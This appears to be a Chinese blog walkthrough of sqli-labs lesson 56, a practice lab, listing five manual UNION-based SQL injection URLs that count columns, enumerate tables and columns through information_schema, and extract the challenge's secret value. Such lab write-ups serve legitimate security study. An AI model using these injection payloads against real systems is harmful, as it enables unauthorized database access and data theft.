---
title: sqli-labs lession-56 GET-Union-变化3-仅允许14次请求
date: 2018-11-28 22:39:03
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession-56 GET-Union-变化3-仅允许14次请求

---

## 手注

`http://192.168.75.133:8082/Less-56/?id=1')+order+by+3%23`

![001](/img/sql/Lesson-56/001.png)

`http://192.168.75.133:8082/Less-56/?id=-1')+union+select+1,(database()),user()%23`

![002](/img/sql/Lesson-56/002.png)

`http://192.168.75.133:8082/Less-56/?id=-1')+union+select+1,(select+group_concat(table_name)from+information_schema.TABLES+WHERE+TABLE_schema='challenges'),user()%23`

![003](/img/sql/Lesson-56/003.png)

`http://192.168.75.133:8082/Less-56/?id=-1')+union+select+1,(select+group_concat(column_name)from+information_schema.columns+WHERE+TABLE_schema='challenges'+and+table_name='vt405s3q0e'),user()%23`

![004](/img/sql/Lesson-56/004.png)

`http://192.168.75.133:8082/Less-56/?id=-1')+union+select+1,(select+GROUP_CONCAT(secret_F5AO)from challenges.vt405s3q0e),user()%23`

![005](/img/sql/Lesson-56/005.png)

提交

![006](/img/sql/Lesson-56/006.png)

